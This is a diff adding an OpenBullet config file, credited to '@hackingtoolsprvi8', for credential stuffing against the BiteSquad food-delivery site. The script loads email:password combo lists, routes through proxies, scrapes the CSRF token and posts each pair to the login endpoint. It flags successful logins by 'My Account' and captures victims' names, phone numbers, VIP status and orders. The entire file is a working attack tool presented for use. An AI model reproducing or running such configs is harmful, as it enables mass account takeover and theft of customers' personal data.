@@ -1,0 +1,101 @@
+[SETTINGS]
+{
+  "Name": "BiteSquad(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-12-28T06:17:55.9162053+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.bitesquad.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TK PARSE "<SOURCE>" LR "class=\"bitesquad-braces--form\"><input type=\"hidden\" name=\"_csrf_token\" value=\"" "\"" -> VAR "TK" 
+
+REQUEST POST "https://www.bitesquad.com/login_check?application=frontend" 
+  CONTENT "_csrf_token=<TK>&_username=<USER>&_password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 114" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://www.bitesquad.com" 
+  HEADER "referer: https://www.bitesquad.com/login" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?1" 
+  HEADER "sec-ch-ua-platform: \"Android\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "302" 
+    KEY "Invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "My Account" 
+  KEYCHAIN Ban OR 
+    KEY "403 Forbidden" 
+
+#Username PARSE "<SOURCE>" LR "name: '" "'" CreateEmpty=FALSE -> CAP "Username" 
+
+#PhoneNo PARSE "<SOURCE>" LR "phone: '" "'" CreateEmpty=FALSE -> CAP "PhoneNo" 
+
+#IsUnlimited PARSE "<SOURCE>" LR "isUnlimited:  " "," CreateEmpty=FALSE -> CAP "IsUnlimited" 
+
+#IsVIP PARSE "<SOURCE>" LR "isVIP:  " " " CreateEmpty=FALSE -> CAP "IsVIP" 
+
+#Orders PARSE "<SOURCE>" LR "order: " " " CreateEmpty=FALSE -> CAP "Orders" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
